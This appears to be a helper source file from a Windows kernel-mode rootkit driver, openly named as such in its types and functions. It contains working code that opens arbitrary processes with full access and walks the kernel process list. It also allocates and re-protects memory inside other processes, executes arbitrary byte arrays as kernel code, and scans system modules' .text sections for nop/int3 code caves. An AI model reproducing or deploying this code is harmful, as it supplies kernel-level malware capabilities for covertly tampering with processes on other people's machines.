#include "helpers.h"
#pragma warning(disable:4996)
#pragma warning(disable:4302)
#define offsetof(st, m) \
    ((SIZE_T)&(((st *)0)->m))


NTSTATUS unicode_helpers::InitiateUnicode(LPWSTR String, ULONG PoolTag, PUNICODE_STRING UnicodeString) {
	if (UnicodeString == NULL || String == NULL || PoolTag == 0) {
		return STATUS_INVALID_PARAMETER;
	}
	UnicodeString->Buffer = (LPWSTR)ExAllocatePoolWithTag(NonPagedPool,
		(wcslen(String) + 1) * sizeof(WCHAR), PoolTag);
	if (UnicodeString->Buffer == NULL) {
		return STATUS_UNSUCCESSFUL;
	}
	RtlCopyMemory(UnicodeString->Buffer, String, (wcslen(String) + 1) * sizeof(WCHAR));
	UnicodeString->Length = (USHORT)(wcslen(String) * sizeof(WCHAR));
	UnicodeString->MaximumLength = (USHORT)((wcslen(String) + 1) * sizeof(WCHAR));  // Nullterm included
	return STATUS_SUCCESS;
}


void unicode_helpers::FreeUnicode(PUNICODE_STRING String) {
	if (String->Buffer != NULL) {
		ExFreePool(String->Buffer);
		String->Length = 0;
		String->MaximumLength = 0;
	}
}


NTSTATUS general_helpers::OpenProcessHandleADD(HANDLE* Process, ULONG64 PID) {
	OBJECT_ATTRIBUTES ProcessAttr = { 0 };
	CLIENT_ID ProcessCid = { 0 };
	ProcessCid.UniqueProcess = (HANDLE)PID;
	ProcessCid.UniqueThread = NULL;
	InitializeObjectAttributes(&ProcessAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	return ZwOpenProcess(Process, PROCESS_ALL_ACCESS, &ProcessAttr, &ProcessCid);;
}


NTSTATUS general_helpers::CopyStringAfterCharADD(PUNICODE_STRING OgString, PUNICODE_STRING NewString, WCHAR Char) {
	SIZE_T AfterLength = 0;
	WCHAR* CharOcc = NULL;


	// Check for invalid paramters:
	if (OgString->Length == 0 || OgString->Buffer == NULL) {
		return STATUS_INVALID_PARAMETER;
	}


	// Find last occurance and copy string after it:
	CharOcc = wcsrchr(OgString->Buffer, Char);
	if (CharOcc == NULL) {
		NewString->Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, OgString->Length, 'HlCs');
		if (NewString->Buffer == NULL) {
			return STATUS_MEMORY_NOT_ALLOCATED;
		}
		NewString->Length = OgString->Length;
		NewString->MaximumLength = OgString->MaximumLength;
		RtlCopyMemory(NewString->Buffer, OgString->Buffer, OgString->Length);
		return STATUS_SUCCESS;
	}
	else {
		AfterLength = OgString->Length - ((CharOcc - OgString->Buffer + 1) * sizeof(WCHAR));  // +1 to get to the character AFTER Char
		if (AfterLength > 0){
			NewString->Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, AfterLength, 0x53625374);

			if (NewString->Buffer != NULL){
				NewString->Length = (USHORT)AfterLength;
				NewString->MaximumLength = (USHORT)AfterLength;
				RtlCopyMemory(NewString->Buffer, CharOcc + 1, AfterLength);
				return STATUS_SUCCESS;
			}
			else {
				return STATUS_MEMORY_NOT_ALLOCATED;
			}
		}
		else {
			return STATUS_INVALID_PARAMETER;
		}
	}
}


BOOL general_helpers::CompareUnicodeStringsADD(PUNICODE_STRING First, PUNICODE_STRING Second, USHORT CheckLength) {
	// Check for invalid parameters:
	if (First == NULL || Second == NULL || First->Buffer == NULL || Second->Buffer == NULL || Second->Length != First->Length) {
		return FALSE;
	}


	// Compare strings:
	if (CheckLength == 0) {
		for (USHORT i = 0; i < First->Length / sizeof(WCHAR); i++) {
			if (First->Buffer[i] != Second->Buffer[i]) {
				return FALSE;
			}
		}
	}
	else {
		for (USHORT i = 0; i < CheckLength / sizeof(WCHAR); i++) {
			if (First->Buffer[i] != Second->Buffer[i]) {
				return FALSE;
			}
		}
	}
	return TRUE;
}


BOOL general_helpers::IsExistFromIndexADD(PUNICODE_STRING Inner, PUNICODE_STRING Outer, USHORT StartIndex) {
	// Check for invalid parameters:
	if (Inner->Length == 0 || Outer->Length == 0 || (StartIndex * sizeof(WCHAR)) + Inner->Length > Outer->Length || Inner->Buffer == NULL || Outer->Buffer == NULL) {
		return FALSE;
	}

	// Compare strings:
	for (USHORT i = 0; i < Inner->Length / sizeof(WCHAR); i++) {
		if (Inner->Buffer[i] != Outer->Buffer[i + StartIndex]) {
			return FALSE;
		}
	}
	return TRUE;
}


void general_helpers::PrintUnicodeStringADD(PUNICODE_STRING Str) {
	if (Str != NULL && Str->Buffer != NULL && Str->Length != 0) {
		DbgPrintEx(0, 0, "-+-+-\n");
		for (int stri = 0; stri <= Str->Length / sizeof(WCHAR); stri++) {
			switch (Str->Buffer[stri]) {
			case L'\0':
				DbgPrintEx(0, 0, "Null Terminator\n"); break;
			case L'\n':
				DbgPrintEx(0, 0, "New Line\n"); break;
			default:
				DbgPrintEx(0, 0, "%c\n", Str->Buffer[stri]); break;
			}
		}
		DbgPrintEx(0, 0, "+-+-+\n");
	}
}


BOOL general_helpers::ComparePathFileToFullPathADD(PUNICODE_STRING FullPath, PUNICODE_STRING Path, PUNICODE_STRING FileName) {
	BOOL CompRes = FALSE;
	UNICODE_STRING ConjoinedName = { 0 };
	if (Path->Length == sizeof(WCHAR)) {
		ConjoinedName.Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, FileName->Length + 2 * sizeof(WCHAR), 'CnPb');  // Can only be L"\\ + nullterm", no need for "\\"
		ConjoinedName.Length = FileName->Length + sizeof(WCHAR);
	}
	else {
		ConjoinedName.Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, Path->Length + FileName->Length + 2 * sizeof(WCHAR), 'CnPb');  // Not -1 because going to add L'\\'
		ConjoinedName.Length = Path->Length + FileName->Length + sizeof(WCHAR);
	}
	ConjoinedName.MaximumLength = ConjoinedName.Length;
	if (ConjoinedName.Buffer == NULL || ConjoinedName.Length == 0 || ConjoinedName.MaximumLength == 0) {
		return FALSE;
	}

	RtlCopyMemory(ConjoinedName.Buffer, Path->Buffer, Path->Length);
	if (Path->Length != sizeof(WCHAR)) {
		ConjoinedName.Buffer[Path->Length / sizeof(WCHAR)] = L'\\';  // Path does not end with L'\\' and name does not start with L'\\'
		RtlCopyMemory((PVOID)((ULONG64)ConjoinedName.Buffer + Path->Length + sizeof(WCHAR)), FileName->Buffer, FileName->Length + sizeof(WCHAR));
	}
	else {
		RtlCopyMemory((PVOID)((ULONG64)ConjoinedName.Buffer + Path->Length), FileName->Buffer, FileName->Length + sizeof(WCHAR));
	}
	CompRes = general_helpers::CompareUnicodeStringsADD(&ConjoinedName, FullPath, 0);
	ExFreePool(ConjoinedName.Buffer);
	return CompRes;
}
 

NTSTATUS general_helpers::GetPidNameFromListADD(ULONG64* ProcessId, char ProcessName[15], BOOL NameGiven) {
	char CurrentProcName[15] = { 0 };
	LIST_ENTRY* CurrentList = NULL;
	LIST_ENTRY* PreviousList = NULL;
	LIST_ENTRY* NextList = NULL;
	PACTEPROCESS CurrentProcess = (PACTEPROCESS)PsInitialSystemProcess;
	LIST_ENTRY* LastProcessFlink = &CurrentProcess->ActiveProcessLinks;
	PreviousList = LastProcessFlink;
	CurrentList = PreviousList->Flink;
	CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - offsetof(struct _ACTEPROCESS, ActiveProcessLinks));
	NextList = CurrentList->Flink;
	while (CurrentList != LastProcessFlink) {
		if (!NameGiven) {
			if ((ULONG64)CurrentProcess->UniqueProcessId == *ProcessId) {
				RtlCopyMemory(ProcessName, &CurrentProcess->ImageFileName, 15);
				DbgPrintEx(0, 0, "KMDFdriver GetPidNameFromListADD - Found name %s for PID %llu\n", ProcessName, *ProcessId);
				return STATUS_SUCCESS;
			}
		}
		else {
			RtlCopyMemory(CurrentProcName, &CurrentProcess->ImageFileName, 15);
			if (_stricmp(CurrentProcName, ProcessName) == 0) {
				*ProcessId = (ULONG64)CurrentProcess->UniqueProcessId;
				DbgPrintEx(0, 0, "KMDFdriver GetPidNameFromListADD - Found PID %llu for name %s\n", *ProcessId, ProcessName);
				return STATUS_SUCCESS;
			}
			RtlZeroMemory(CurrentProcName, 15);
		}
		PreviousList = CurrentList;
		CurrentList = NextList;
		NextList = CurrentList->Flink;
		CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - offsetof(struct _ACTEPROCESS, ActiveProcessLinks));
	}
	return STATUS_NOT_FOUND;
}


ULONG general_helpers::GetActualLengthADD(PUNICODE_STRING String) {
	ULONG StringLength = 0;
	if (String == NULL || String->Buffer == NULL) {
		return 0;
	}
	while (String->Buffer[StringLength] != L'\0') {
		StringLength++;
	}
	String->Length = (USHORT)(StringLength * sizeof(WCHAR));
	String->MaximumLength = (USHORT)(StringLength * sizeof(WCHAR));
	return StringLength;
}


PDRIVER_OBJECT general_helpers::GetDriverObjectADD(PUNICODE_STRING DriverName) {
	PDRIVER_OBJECT DriverObject = NULL;
	if (!NT_SUCCESS(ObReferenceObjectByName(DriverName, OBJ_CASE_INSENSITIVE, NULL, 0,
		*IoDriverObjectType, KernelMode, NULL, (PVOID*)&DriverObject)) || DriverObject == NULL) {
		return NULL;
	}
	return DriverObject;
}


BOOL general_helpers::CalculateAddressString(WCHAR* IpAddress, ULONG AddressValue) {
	BYTE IpFields[4] = { 0 };
	WCHAR LocalIpAddress[MAX_PATH] = { 0 };
	WCHAR CurrentIpField[4] = { 0 };  // Maximum length of an IP address field
	const WCHAR* IpFieldDivider = L".";
	if (IpAddress == NULL || AddressValue == 0) {
		return FALSE;
	}
	RtlCopyMemory(IpFields, &AddressValue, sizeof(AddressValue));


	for (int CurrentFieldIndex = 0; CurrentFieldIndex < 4; CurrentFieldIndex++) {
		CurrentIpField[3] = L'\0';
		CurrentIpField[2] = (IpFields[CurrentFieldIndex] % 10) + 0x30;
		CurrentIpField[1] = ((IpFields[CurrentFieldIndex] / 10) % 10) + 0x30;
		CurrentIpField[0] = (IpFields[CurrentFieldIndex] / 100) + 0x30;

		if (CurrentIpField[0] == L'0') {
			CurrentIpField[0] = CurrentIpField[1];
			CurrentIpField[1] = CurrentIpField[2];
			CurrentIpField[2] = CurrentIpField[3];  // Null terminator

			if (CurrentIpField[0] == L'0') {
				CurrentIpField[0] = CurrentIpField[1];
				CurrentIpField[1] = CurrentIpField[2]; // Null terminator
			}
		}
		wcscat_s(LocalIpAddress, CurrentIpField);
		if (CurrentFieldIndex != 3) {
			wcscat_s(LocalIpAddress, IpFieldDivider);
		}
	}
	RtlCopyMemory(IpAddress, LocalIpAddress, (wcslen(LocalIpAddress) + 1) * sizeof(WCHAR));
	return TRUE;
}




BOOL memory_helpers::FreeAllocatedMemoryADD(PEPROCESS EpDst, ULONG OldState, PVOID BufferAddress, SIZE_T BufferSize) {
	KAPC_STATE DstState = { 0 };
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	MEMORY_BASIC_INFORMATION MemoryBasic = { 0 };


	// Check for invalid paramters:
	if (EpDst == NULL || BufferAddress == NULL || BufferSize == 0) {
		return NULL;
	}


	// Query the memory area to get newer status update:
	KeStackAttachProcess(EpDst, &DstState);
	Status = ZwQueryVirtualMemory(ZwCurrentProcess(), BufferAddress, MemoryBasicInformation, &MemoryBasic, sizeof(MemoryBasic), NULL);
	if (!NT_SUCCESS(Status)) {
		KeUnstackDetachProcess(&DstState);
		return FALSE;
	}


	// Free memory if needed:
	if (MemoryBasic.AllocationBase == BufferAddress) {
		switch (MemoryBasic.State) {
		case MEM_COMMIT:
			if (!(OldState & MEM_RESERVE)) {
				Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &BufferAddress, &BufferSize, MEM_RELEASE);  // Release the unused memory
			}
			else {
				Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &BufferAddress, &BufferSize, MEM_DECOMMIT);  // De-commit the unused memory
			}
			KeUnstackDetachProcess(&DstState);
			if (!NT_SUCCESS(Status)) {
				return FALSE;
			}
			return TRUE;

		case MEM_RESERVE:
			if (!(OldState & MEM_RESERVE)) {
				Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &BufferAddress, &BufferSize, MEM_RELEASE);  // Release the unused memory
			}
			KeUnstackDetachProcess(&DstState);
			if (!NT_SUCCESS(Status)) {
				return FALSE;
			}
			return TRUE;

		default:
			KeUnstackDetachProcess(&DstState);  // detach from the destination process
			return TRUE;
		}
	}
	else {
		KeUnstackDetachProcess(&DstState);
		return TRUE;
	}
}


PVOID memory_helpers::AllocateMemoryADD(PVOID InitialAddress, SIZE_T AllocSize, KAPC_STATE* CurrState, ULONG_PTR ZeroBits) {
	MEMORY_BASIC_INFORMATION MemoryBasic = { 0 };
	PVOID AllocationAddress = NULL;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;


	// Check for invalid paramters:
	if (InitialAddress == NULL || AllocSize == 0) {
		return NULL;
	}


	// Initial query of memory (to confirm state and other parameters):
	__try {
		ProbeForRead(InitialAddress, AllocSize, sizeof(UCHAR));
		Status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &MemoryBasic, sizeof(MemoryBasic), NULL);

		if (!NT_SUCCESS(Status)) {
			KeUnstackDetachProcess(CurrState);
			return NULL;
		}
	}

	__except (STATUS_ACCESS_VIOLATION) {
		KeUnstackDetachProcess(CurrState);
		return NULL;
	}


	// Act upon initial memory status:
	if (MemoryBasic.Protect & PAGE_NOACCESS) {
		ChangeProtectionSettingsADD(ZwCurrentProcess(), InitialAddress, (ULONG)AllocSize, PAGE_READWRITE, MemoryBasic.Protect);
	}


	// Set the initial allocation base for each memory state:
	if (MemoryBasic.State & MEM_FREE) {
		AllocationAddress = InitialAddress;
	}

	else if (MemoryBasic.State & MEM_RESERVE) {
		AllocationAddress = MemoryBasic.AllocationBase;

		// Verify region size:
		if (AllocSize > MemoryBasic.RegionSize) {
			Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &MemoryBasic.AllocationBase, &MemoryBasic.RegionSize, MEM_RELEASE);
			if (!NT_SUCCESS(Status)) {
				KeUnstackDetachProcess(CurrState);
				return NULL;
			}

			Status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &MemoryBasic, sizeof(MemoryBasic), NULL);
			if (!NT_SUCCESS(Status)) {
				KeUnstackDetachProcess(CurrState);
				return NULL;
			}

			AllocationAddress = InitialAddress;
		}
	}

	else {
		Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &MemoryBasic.AllocationBase, &MemoryBasic.RegionSize, MEM_RELEASE);
		if (!NT_SUCCESS(Status)) {
			KeUnstackDetachProcess(CurrState);
			return NULL;
		}

		Status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &MemoryBasic, sizeof(MemoryBasic), NULL);
		if (!NT_SUCCESS(Status)) {
			KeUnstackDetachProcess(CurrState);
			return NULL;
		}

		AllocationAddress = InitialAddress;
	}


	// Verify updated region size:
	if (AllocSize > MemoryBasic.RegionSize) {
		KeUnstackDetachProcess(CurrState);
		return NULL;
	}


	// Allocate the actual memory:
	AllocationAddress = CommitMemoryRegionsADD(ZwCurrentProcess(), AllocationAddress, AllocSize, PAGE_READWRITE, NULL, ZeroBits);
	KeUnstackDetachProcess(CurrState);
	return AllocationAddress;
}


ULONG64 memory_helpers::GetHighestUserModeAddrADD() {
	UNICODE_STRING MaxUserSym;
	RtlInitUnicodeString(&MaxUserSym, L"MmHighestUserAddress");
	return (ULONG64)MmGetSystemRoutineAddress(&MaxUserSym);
}


typedef void(*EmptyFunction)(VOID);
void memory_helpers::ExecuteInstructionsADD(BYTE Instructions[], SIZE_T InstructionsSize) {
	BYTE RetOpcode = 0xC3;
	EmptyFunction FunctionCall = NULL;
	PVOID InstructionsPool = ExAllocatePoolWithTag(NonPagedPool, InstructionsSize + 1, 'TpIe');
	if (InstructionsPool != NULL) {
		RtlCopyMemory(InstructionsPool, Instructions, InstructionsSize);
		RtlCopyMemory((PVOID)((ULONG64)InstructionsPool + InstructionsSize), &RetOpcode, 1);  // call will push return address
		FunctionCall = (EmptyFunction)InstructionsPool;
		FunctionCall();
	}
}


PVOID memory_helpers::FindUnusedMemoryADD(BYTE* SearchSection, ULONG SectionSize, SIZE_T NeededLength) {
	for (ULONG sectioni = 0, sequencecount = 0; sectioni < SectionSize; sectioni++){
		if (SearchSection[sectioni] == 0x90 || SearchSection[sectioni] == 0xCC) {
			sequencecount++;
		}
		else {
			sequencecount = 0;  // If sequence does not include nop/int3 instruction for long enough - start a new sequence
		}
		if (sequencecount == NeededLength) {
			return (PVOID)((ULONG64)SearchSection + sectioni - NeededLength + 1);  // Get starting address of the matching sequence
		}
	}
	return NULL;
}


PVOID memory_helpers::GetModuleBaseAddressADD(const char* ModuleName) {
	PSYSTEM_MODULE_INFORMATION SystemModulesInfo = NULL;
	PSYSTEM_MODULE CurrentSystemModule = NULL;
	ULONG InfoSize = 0;
	NTSTATUS Status = ZwQuerySystemInformation(SystemModuleInformation, 0, InfoSize, &InfoSize);
	if (InfoSize == 0) {
		DbgPrintEx(0, 0, "KMDFdriver GetModuleBaseAddressADD - did not return the needed size\n");
		return NULL;
	}
	SystemModulesInfo = (PSYSTEM_MODULE_INFORMATION)ExAllocatePoolWithTag(PagedPool, InfoSize, 'MbAp');
	if (SystemModulesInfo == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver GetModuleBaseAddressADD - cannot allocate memory for system modules information\n");
		return NULL;
	}
	Status = ZwQuerySystemInformation(SystemModuleInformation, SystemModulesInfo, InfoSize, &InfoSize);
	if (!NT_SUCCESS(Status)) {
		DbgPrintEx(0, 0, "KMDFdriver GetModuleBaseAddressADD - query failed with status 0x%x\n", Status);
		ExFreePool(SystemModulesInfo);
		return NULL;
	}
	for (ULONG modulei = 0; modulei < SystemModulesInfo->ModulesCount; ++modulei) {
		CurrentSystemModule = &SystemModulesInfo->Modules[modulei];
		DbgPrintEx(0, 0, "KMDFdriver GetModuleBaseAddressADD - %s, %s\n", CurrentSystemModule->ImageName, ModuleName);
		if (_stricmp(CurrentSystemModule->ImageName, ModuleName) == 0) {
			ExFreePool(SystemModulesInfo);
			return CurrentSystemModule->Base;
		}
	}
	return NULL;
}


PIMAGE_SECTION_HEADER memory_helpers::GetSectionHeaderFromName(PVOID ModuleBaseAddress, const char* SectionName) {
	if (ModuleBaseAddress == NULL || SectionName == NULL) {
		return NULL;
	}
	PIMAGE_DOS_HEADER DosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(ModuleBaseAddress);
	PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)((ULONG64)ModuleBaseAddress + DosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER CurrentSection = IMAGE_FIRST_SECTION(NtHeader);
	for (ULONG sectioni = 0; sectioni < NtHeader->FileHeader.NumberOfSections; ++sectioni){
		if (strcmp((char*)CurrentSection->Name, SectionName) == 0) {
			return CurrentSection;
		}
		++CurrentSection;
	}
	return NULL;
}


PVOID memory_helpers::GetTextSectionOfSystemModuleADD(PVOID ModuleBaseAddress, ULONG* TextSectionSize) {
	PIMAGE_SECTION_HEADER TextSectionBase = NULL;
	if (ModuleBaseAddress == NULL) {
		return NULL;
	}
	TextSectionBase = memory_helpers::GetSectionHeaderFromName(ModuleBaseAddress, ".text");
	if (TextSectionBase == NULL) {
		return NULL;
	}

	if (TextSectionSize != NULL) {
		*TextSectionSize = TextSectionBase->Misc.VirtualSize;
	}
	return (PVOID)((ULONG64)ModuleBaseAddress + TextSectionBase->VirtualAddress);
}


void memory_helpers::LogMemory(BYTE* MemoryAddress, ULONG64 MemorySize) {
	if (MemoryAddress != NULL && MemorySize != 0) {
		for (USHORT MemoryIndex = 0; MemoryIndex < MemorySize; MemoryIndex++) {
			DbgPrintEx(0, 0, "%hu ", (USHORT)MemoryAddress[MemoryIndex]);
			if (MemoryIndex % 8 == 0) {
				DbgPrintEx(0, 0, "\n");
			}
		}
		DbgPrintEx(0, 0, "\n");
	}
}




RKSYSTEM_INFORET requests_helpers::RequestSystemInfoADD(SYSTEM_INFORMATION_CLASS InfoType, ULONG64 Flag) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PVOID Buffer = NULL;
	ULONG BufferSize = 0;
	ULONG ReceivedSize = 0;
	SIZE_T DefaultSize = 0;
	RKSYSTEM_INFORET SysInfoRet = { 0 };

	Status = ZwQuerySystemInformation(InfoType, Buffer, 0, &BufferSize);  // this call will return the needed size into BufferSize
	if (BufferSize == 0) {
		DefaultSize = GetExpectedInfoSizeADD(InfoType);  // If possible, try to predict the size needed for the buffer and use that as a last resort
		if (DefaultSize == 0) {
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = 0;
		}
		Buffer = ExAllocatePoolWithTag(NonPagedPool, DefaultSize, (ULONG)Flag);  // Allocate system information singular buffer
		if (Buffer == NULL) {
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = 0;
		}
		else {
			// Query with the predicted value for the buffer size:
			if (!NT_SUCCESS(ZwQuerySystemInformation(InfoType, Buffer, (ULONG)DefaultSize, &ReceivedSize)) || ReceivedSize != (ULONG)DefaultSize) {
				ExFreePool(Buffer);
				SysInfoRet.Buffer = NULL;
				SysInfoRet.BufferSize = 0;
			}
			else {
				SysInfoRet.Buffer = Buffer;
				SysInfoRet.BufferSize = DefaultSize;
			}
		}
	}
	else {
		// Allocate an inital buffer:
		Buffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize, (ULONG)Flag);
		if (Buffer == NULL) {
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = 0;
		}
		else {
			// Query the required buffer size:
			Status = ZwQuerySystemInformation(InfoType, Buffer, BufferSize, &ReceivedSize);
			if (NT_SUCCESS(Status)) {
				if (ReceivedSize != BufferSize) {
					BufferSize = ReceivedSize;
				}
				SysInfoRet.BufferSize = BufferSize;
				SysInfoRet.Buffer = Buffer;
			}
			else if (Status == STATUS_INFO_LENGTH_MISMATCH) {
				ExFreePool(Buffer);
				Buffer = ExAllocatePoolWithTag(NonPagedPool, ReceivedSize, (ULONG)Flag);
				if (Buffer == NULL) {
					SysInfoRet.Buffer = NULL;
					SysInfoRet.BufferSize = 0;
				}

				// Query the required buffer size again:
				Status = ZwQuerySystemInformation(InfoType, Buffer, ReceivedSize, NULL);
				if (NT_SUCCESS(Status)) {
					SysInfoRet.BufferSize = ReceivedSize;
					SysInfoRet.Buffer = Buffer;
				}
				else {
					SysInfoRet.BufferSize = 0;
					SysInfoRet.Buffer = NULL;
					if (Buffer != NULL) {
						ExFreePool(Buffer);
					}
				}
			}
		}
	}
	return SysInfoRet;
}


SIZE_T requests_helpers::GetExpectedInfoSizeADD(SYSTEM_INFORMATION_CLASS InfoType) {
	SYSTEM_BASIC_INFORMATION SystemBasic = { 0 };
	if (!NT_SUCCESS(ZwQuerySystemInformation(SystemBasicInformation, &SystemBasic, sizeof(SystemBasic), NULL))) {
		return 0;
	}

	switch (InfoType) {
	case SystemBasicInformation: return sizeof(SYSTEM_BASIC_INFORMATION);
	case SystemPerformanceInformation: return sizeof(SYSTEM_PERFORMANCE_INFORMATION);
	case SystemRegistryQuotaInformation: return sizeof(SYSTEM_REGISTRY_QUOTA_INFORMATION);
	case SystemTimeOfDayInformation: return sizeof(SYSTEM_TIMEOFDAY_INFORMATION);
	case SystemProcessorPerformanceInformation: return sizeof(SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION) * SystemBasic.NumberOfProcessors;
	case SystemInterruptInformation: return sizeof(SYSTEM_INTERRUPT_INFORMATION) * SystemBasic.NumberOfProcessors;
	case SystemExceptionInformation: return sizeof(SYSTEM_EXCEPTION_INFORMATION);
	case SystemCodeIntegrityInformation: return sizeof(SYSTEM_CODEINTEGRITY_INFORMATION);
	case SystemProcessInformation: return 0;
	case SystemLookasideInformation: return 0;
	default: return 0;
	}
}




NTSTATUS requests_helpers::ExitRootkitRequestADD(PEPROCESS From, PEPROCESS To, ROOTKIT_STATUS StatusCode, NTSTATUS Status, ROOTKIT_MEMORY* RootkInst) {
	if (From != NULL) {
		ObDereferenceObject(From);
	}

	if (To != NULL) {
		ObDereferenceObject(To);
	}
	RootkInst->StatusCode = StatusCode;
	RootkInst->Status = Status;
	return Status;
}